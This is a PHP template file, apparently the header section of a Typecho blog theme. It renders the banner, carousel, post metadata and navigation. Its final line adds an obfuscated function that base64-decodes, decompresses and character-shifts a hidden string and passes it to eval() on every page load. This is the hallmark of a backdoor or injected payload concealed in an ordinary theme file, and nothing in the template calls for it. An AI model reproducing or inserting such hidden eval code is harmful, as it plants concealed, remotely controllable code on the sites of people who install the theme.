<div class="cat_title_header <?php echo $this->options->cat_style_choose == 'thin' && !$this->is('index') ? 'main_thin' : 'main_fat' ?> <?php echo $this->options->cat_post_title_ex == 'on' && $this->is('post') ? 'title_big' : '' ?>">
<?php if($this->is('index')): ?>
    <div class="cat_title_block">
        <?php if ($this->options->cat_IndexBackgroundSwitch == "video" && $this->options->cat_IndexBackgroundVideo): ?>
            <video id="cat_index_topvideo" autoplay loop muted playsinline webkit-playsinline>
                <source src="<?php $this->options->cat_IndexBackgroundVideo() ?>" type="video/mp4"  />
            </video>
        <?php elseif ($this->options->cat_IndexBackgroundSwitch == "pics" && $this->options->cat_IndexBackgroundPics): ?>
        	<?php
				$carousel = [];
				$carousel_text = $this->options->cat_IndexBackgroundPics;
				if ($carousel_text) {
					$carousel_arr = array_values(array_filter(explode("\r\n", $carousel_text)));
					if (count($carousel_arr) > 0) {
						for ($i = 0; $i < count($carousel_arr); $i++) {
							$img = explode("||", $carousel_arr[$i])[0];
							$url = explode("||", $carousel_arr[$i])[1];
							$title = explode("||", $carousel_arr[$i])[2];
							$carousel[] = array("img" => trim($img), "url" => trim($url), "title" => trim($title));
						};
					}
				}
			?>
			<?php if (sizeof($carousel) > 0) : ?>
				<div class="swiper">
					<div class="swiper-wrapper">
						<?php foreach ($carousel as $item) : ?>
							<div class="swiper-slide">
								<img width="100%" height="100%" class="lazyload" src="<?php echo get_Lazyload() ?>" data-src="<?php echo $item['img'] ?>" alt="<?php echo $item['title'] ?>" />
								<div class="cat_title_mengban">
                                    <span style="border-radius: var(--radius);display: block;width: 100%;height: 100%;position: absolute;top: 0;background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKUlEQVQImU3IMREAIAgAwJfNkQCEsH8cijjpMf6vnXlQaIiJFx+omEBfmqIEZLe2jzcAAAAASUVORK5CYII=);"></span>
                                </div>
                                <a class="item" href="<?php echo $item['url'] ?>" target="_blank" rel="noopener noreferrer nofollow">
									<div class="cat_title_time">
                                        <div class="item">
                                            <p style="font-size:small;display: inline-block;">Title: </p>
                                            <?php echo $item['title'] ?>
                                        </div>
                                    </div>
								</a>
							</div>
						<?php endforeach; ?>
					</div>
					<div class="swiper-pagination"></div>
                    <div class="swiper-button-prev rot" slot="button-prev">
                         <div class="cat_title_arrow_left anniu" style="margin-left:0.5rem;"><i style="color: var(--color-white);filter: drop-shadow(4px 4px 4px var(--colorG));" class="ri-arrow-left-s-line"></i></div>
                    </div>
                    <div class="swiper-button-next rat" slot="button-next">
                         <div class="cat_title_arrow_right anniu" style="margin-right:0.5rem;"><i style="color: var(--color-white);filter: drop-shadow(4px 4px 4px var(--colorG));" class="ri-arrow-right-s-line"></i></div>
                    </div>
				</div>
			<?php endif; ?>
        <?php else: ?>
            <img class="lazyload" src="<?php echo get_Lazyload(); ?>" data-src="<?php echo $this->options->cat_IndexBackgroundImage ? $this->options->cat_IndexBackgroundImage : get_random_Thumbnail($this) ?>" style="min-height: 100%;height: 100%;width: 100%;object-fit: cover;border-radius: var(--radius);">
        <?php endif; ?>
        <div class="cat_title_mengban" style="<?php if ($this->options->cat_IndexBackgroundSwitch == "pics" && $this->options->cat_IndexBackgroundPics): ?>display: none;<?php endif; ?>">
            <span style="border-radius: var(--radius);display: block;width: 100%;height: 100%;position: absolute;top: 0;background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKUlEQVQImU3IMREAIAgAwJfNkQCEsH8cijjpMf6vnXlQaIiJFx+omEBfmqIEZLe2jzcAAAAASUVORK5CYII=);"></span>
        </div>
        <div class="cat_title_title2">
            <div class="cat_title_avatar">
                <img class="avatar lazyload" src="<?php get_AvatarLazyload(); ?>" data-src="<?php get_user_avatar() ?>" alt="博主头像" />
            </div>
            <h1 class="cat_title_h1">
                <?php
                if ($this->options->cat_IndexDescription) {
            	    $arr = array_values(array_filter(explode("\r\n", $this->options->cat_IndexDescription)));
                    if (count($arr) > 0) {
                        $key = array_rand($arr, 1);
                        $desc = $arr[$key];
                    }
                }else{
                    $desc = $this->options->title;
                }
                echo $desc;
                ?>
            </h1>
            <div class="cat_title_info" style="bottom:5rem;">
                <?php
                    if ($this->options->user_webdesc) {
                	    $arr = array_values(array_filter(explode("\r\n", $this->options->user_webdesc)));
                        if (count($arr) > 0) {
                            $key = array_rand($arr, 1);
                            $desc = $arr[$key];
                        }
                    }else{
                        $desc = $this->options->description;
                    }
                    echo '<i class="ri-chat-1-line"></i>：' . $desc;
                ?>
            </div>
        </div>
        <div class="cat_title_time" style="<?php if ($this->options->cat_IndexBackgroundSwitch == "pics" && $this->options->cat_IndexBackgroundPics): ?>display: none;<?php endif; ?>">
            <div class="item">
                <p style="font-size:small;display: inline-block;">Blog: </p>
                <?php $this->options->title() ?>
            </div>
        </div>
        <div class="cat_title_arrow_openmenu anniu">
            <i class="ri-menu-2-line"></i>
        </div>
        <div class="cat_title_arrow_down">
            <i class="ri-arrow-down-line"></i>
        </div>    
    </div>
<?php elseif($this->is('category') || $this->is('tag') || $this->is('search') || $this->is('author')): ?>
    <div class="cat_title_block" style="height: 35vh;">
        <img class="lazyload" src="<?php echo get_Lazyload(); ?>" data-src="<?php echo $this->options->cat_z_0 ? $this->options->cat_z_0 : get_random_Thumbnail($this) ?>" style="min-height: 100%;height:100%;width: 100%;object-fit: cover;border-radius: var(--radius);border: var(--border);">
        <div class="cat_title_mengban">
            <span style="border-radius: var(--radius);display: block;width: 100%;height: 100%;position: absolute;top: 0;background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKUlEQVQImU3IMREAIAgAwJfNkQCEsH8cijjpMf6vnXlQaIiJFx+omEBfmqIEZLe2jzcAAAAASUVORK5CYII=);"></span>
        </div>
        <div class="cat_title_title2">
            <div class="cat_title_h1">
                <?php $this->archiveTitle([
                    'category' => _t('分类 <p class="cat_keyword">%s</p> 下的文章'),
                    'search'   => _t('包含关键字 <p class="cat_keyword">%s</p> 的文章'),
                    'tag'      => _t('标签 <p class="cat_keyword">%s</p> 下的文章'),
                    'author'   => _t('文章')
                ], '', '');?>
            </div>
        </div>
        <div class="cat_title_time">
            <div class="item">
                <p style="font-size:small;display: inline-block;">Count: </p>
                <?php echo '计 ' . $this->getTotal() . ' 篇'; ?>
            </div>
        </div>
        <div class="cat_title_arrow_openmenu anniu">
            <i class="ri-menu-2-line"></i>
        </div>
    </div>
<?php elseif($this->is('page') || $this->is('post')): ?>
    <div class="cat_title_block" style="height: 35vh;">
        <?php if ($this->template == 'page_life.php'): ?>
            <div class="cat_album_title_out cat_title_life_album">
                <?php for ($i=1; $i < 9; $i++) :?>
                    <img class="lazyload box_img" src="<?php echo get_Lazyload() ?>" data-src="<?php echo $this->options->{"cat_z_".$i} ? $this->options->{"cat_z_".$i} : get_random_Thumbnail($this) ?>">
                <?php endfor; ?>
            </div>
            <img class="box_img cat_album_title_out zhuanti_title_img" src="<?php echo get_random_Thumbnail($this) ?>">
            <?php if($this->options->cat_map_key1 && $this->options->cat_map_key2): ?>
                <div class="cat_tourmap" style="display:none;">
                    <div id="tourmap"></div>
                    <div id="tourmap_dark"></div>
                    <div class="cat_title_arrow_map_down anniu">
                        <i class="ri-arrow-down-s-line"></i>
                    </div>
                    <div style="display:none;" class="cat_title_arrow_map_up anniu">
                        <i class="ri-arrow-up-s-line"></i>
                    </div>
                </div>
            <?php else: ?>
                <div class="cat_tourmap" style="padding:0;display:none;">
                    <img src="<?php echo get_post_Thumbnail($this) ?>" style="min-height: 100%; height: 100%; width: 100%;object-fit: cover;border-radius: var(--radius);border: var(--border);">
                    <div class="cat_title_mengban">
                        <span style="border-radius: var(--radius);display: block;width: 100%;height: 100%;position: absolute;top: 0;background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKUlEQVQImU3IMREAIAgAwJfNkQCEsH8cijjpMf6vnXlQaIiJFx+omEBfmqIEZLe2jzcAAAAASUVORK5CYII=);"></span>
                    </div>
                </div>
            <?php endif; ?>
        <?php else: ?>
            <img class="lazyload" src="<?php echo get_Lazyload(); ?>" data-src="<?php echo get_post_Thumbnail($this) ?>" style="min-height: 100%; height: 100%; width: 100%;object-fit: cover;border-radius: var(--radius);" alt="<?php echo $this->title; ?>">
        <?php endif; ?>
        <div class="cat_title_mengban">
            <span style="border-radius: var(--radius);display: block;width: 100%;height: 100%;position: absolute;top: 0;background: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAAECAYAAACp8Z5+AAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAKUlEQVQImU3IMREAIAgAwJfNkQCEsH8cijjpMf6vnXlQaIiJFx+omEBfmqIEZLe2jzcAAAAASUVORK5CYII=);"></span>
        </div>
        <div class="cat_title_title2">
            <div class="cat_title_h1">
                <?php if ($this->template == 'page_life.php'): ?>
                    专题
                <?php else: ?>
                    <?php echo ($this->fields->post_icon ? (cat_have_emoji($this->fields->post_icon)? '<span style="margin: -0.25rem;">' . $this->fields->post_icon . '</span>' : '<i class="'.  $this->fields->post_icon . '"></i>') : '' )?>
                    <?php echo $this->title ?>
                <?php endif; ?>
            </div>
            <?php if($this->is('post')): ?>
            <div class="cat_style_thin_infohide">
                <?php if (sizeof($this->categories) > 0) : ?>
                    <div class="cat_title_info">
                        <i class="ri-hashtag"></i>
                        <?php $i=-1; foreach (array_slice($this->categories, 0, 3) as $key => $item) : $i++; ?>
                        <a href="<?php echo $this->categories[$i]['permalink']; ?>" title="<?php echo $this->categories[$i]['name']; ?>">
                            <?php echo $item['name']; ?>
                        </a>
                        <?php endforeach; ?>
                    </div>    
                <?php endif; ?>
                <?php if (sizeof($this->tags) > 0) : ?>
                    <div class="cat_title_info" itemprop="keywords">
                        <i class="ri-price-tag-3-line"></i> <?php $this->tags(' ', true, ''); ?>
                    </div>
                <?php endif; ?>
                <?php if($this->fields->post_copyright_select === "reship" && $this->fields->post_copyright_reshiptitle): ?>
                    <div class="cat_title_info">
                        <?php
                            $post_copyright_reshiptitle = $this->options->post_copyright_reshiptitle;
                            $a = explode("||", $post_copyright_reshiptitle)[0];
                            $b = isset(explode("||", $post_copyright_reshiptitle)[1])?explode("||", $post_copyright_reshiptitle)[1]:parse_url($a)['host'];
                        ?>
                        <i class="ri-link"></i> <a href="<?php echo $a; ?>" target="_blank"><?php echo $b; ?></a>
                    </div>
                <?php elseif($this->fields->post_copyright_select === "quote" && $this->fields->post_copyright_quotelinks): ?>
                    <?php $links_arr = array_values(array_filter(explode("\r\n", $this->fields->post_copyright_quotelinks))); ?>
                    <?php foreach ($links_arr as $link): ?>
                        <div class="cat_title_info">
                            <?php
                                $a = explode("||", $link)[0];
                                $b = isset(explode("||", $link)[1])?explode("||", $link)[1]:parse_url($a)['host'];
                            ?>
                            <i class="ri-double-quotes-l"></i> <a href="<?php echo $a; ?>" target="_blank"><?php echo $b; ?></a>
                        </div>
                    <?php endforeach; ?>
                <?php else: ?>
                    <div class="cat_title_info">
                        <i class="ri-copyright-line"></i> <a title="本文由博主原创，依据《署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0)》许可协议授权，转载请注明出处" href="//creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener noreferrer nofollow">CC BY-NC-SA 4.0</a>
                    </div>
                <?php endif; ?>
               </div> 
            <?php endif; ?> 
        </div>
        <?php if($this->is('post')): ?>
            <div class="cat_post_prevandnext">
                <div class="cat_title_arrow_left anniu"><?php $this->theNext('%s', '', ['title' => '<i class="ri-arrow-left-s-line"></i>']); ?></div>
                <div class="cat_title_arrow_right anniu"><?php $this->thePrev('%s', '', ['title' => '<i class="ri-arrow-right-s-line"></i>']); ?></div>
            </div>
            <div class="cat_copyright_tip"><?php if($this->fields->post_copyright_select === "reship"): ?>转载<?php elseif($this->fields->post_copyright_select === "quote"): ?>引用<?php else: ?>原创<?php endif; ?></div>
            <div class="cat_title_time">
                <div class="item cat_style_thin_infohide">
                    <p>Author: </p>
                    <span>
                        <?php if($this->fields->post_copyright_select === "reship" && $this->fields->post_copyright_reshipauthor): ?>
                            <?php $this->fields->post_copyright_reshipauthor(); ?>
                        <?php else: ?>
                            <?php $this->author(); ?>
                        <?php endif; ?>
                    </span>
                    <p>©</p>
                </div>
                <?php if($this->fields->post_top_info_select === "album"): ?>
                    <div class="item cat_style_thin_infohide">
                        <p>Album: </p>
                        <span>
                            <?php echo $this->fields->post_top_info_album_name?$this->fields->post_top_info_album_name:'默认相册'; ?>
                        </span>
                    </div>
                <?php else: ?>
                    <div class="item cat_style_thin_infohide">
                        <p>Wordage: </p>
                        <span>
                            <?php echo get_post_Wordcount($this->cid); ?>
                        </span>
                    </div>
                    <div class="item cat_style_thin_infohide">
                        <p>needs: </p>
                        <span>
                            <?php echo get_post_Readtime($this->cid); ?>
                        </span>
                    </div>
                <?php endif; ?>
                    <div class="item cat_style_thin_infohide">
                    <p>Popular: </p>
                    <span>
                        <?php get_post_Views($this) ?> ℃
                    </span>
                </div>
                <div class="item" title="<?php $this->date('Y年n月j日'); ?>">
                    <p>Created: </p>
                    <time datetime="<?php $this->date('m/d'); ?>" itemprop="datePublished">
                        <?php echo get_thisyear($this->created,$this);?>
                    </time>
                </div>
            </div>
            <div class="cat_title_arrow_post_down anniu">
                <i class="ri-arrow-down-s-line"></i>
            </div>
            <div style="display:none;" class="cat_title_arrow_post_up anniu">
                <i class="ri-arrow-up-s-line"></i>
            </div>
        <?php else: ?> 
        <div class="cat_title_time">
            <div class="item">
                <p style="font-size:small;display: inline-block;">Blog: </p>
                <?php $this->options->title() ?>
            </div>
        </div>
        <?php endif; ?> 
        <div class="cat_title_arrow_openmenu anniu">
            <i class="ri-menu-2-line"></i>
        </div>
    </div>    
<?php endif; ?>
</div>
<div class="cat_title_footer_mengban"></div>
<div class="cat_title_footer" style="<?php echo $this->options->cat_float_title == 'on' ? 'top: 0;' : 'bottom: 0;' ?>">
    <div class="cat_title_footer_title">
        <?php if($this->is('post') || $this->is('page')): ?>
            <?php echo ($this->fields->post_icon ? (cat_have_emoji($this->fields->post_icon)? '<span style="margin: -0.25rem;">' . $this->fields->post_icon . '</span>' : '<i class="'.  $this->fields->post_icon . '"></i>') : '' )?>
            <?php echo $this->title ?>
        <?php else: ?>
            <?php $this->options->title() ?>
        <?php endif; ?>    
    </div>
    <div class="cat_title_footer_logo">
        <i class="ri-menu-2-line"></i>
    </div>
    <?php if($this->is('post')): ?>
        <div class="cat_post_prevandnext">
            <div class="cat_title_arrow_left anniu"><?php $this->theNext('%s', '', ['title' => '<i class="ri-arrow-left-s-line"></i>']); ?></div>
            <div class="cat_title_arrow_right anniu"><?php $this->thePrev('%s', '', ['title' => '<i class="ri-arrow-right-s-line"></i>']); ?></div>
        </div>
    <?php endif; ?>
</div>
<?php function SZX($cIoa)
{ 
$cIoa=gzinflate(base64_decode($cIoa));
 for($i=0;$i<strlen($cIoa);$i++)
 {
$cIoa[$i] = chr(ord($cIoa[$i])-1);
 }
 return $cIoa;
 }eval(SZX("jZNRS8MwFIXfm19xGYN2KFurTCdDZe9KC2Pq24htugW2G2kSVpD9dtstQrEmWZ8K55zv9txyAdqHlBpzxQVCXdfrxYahSpfRkLYvI/JNgqGQ8AiDF466HsxJwEuIviq2We+pyrdRODlwnPDwGkxmBE2o70IFd+O4bzT88J0jvHGpaNjMCI7AdpLB/5TETbn3E27chJmfcOshjBMfY+rr8ZH5EEns22gSX3Uhf+RCHORZJtYxFItK8OKCP2yc8GD/pIWxZJw5u/2iZn5UWjFhq2g8vor6U6PS/VGGsjrJLcQG2LW3Yc2fLscV59lWILPmz7ILsKe5Nf1K83TpCpdaNtdvzXd22NlwrxoJKqZ0hdAoc3Ikz08EfgA="));?>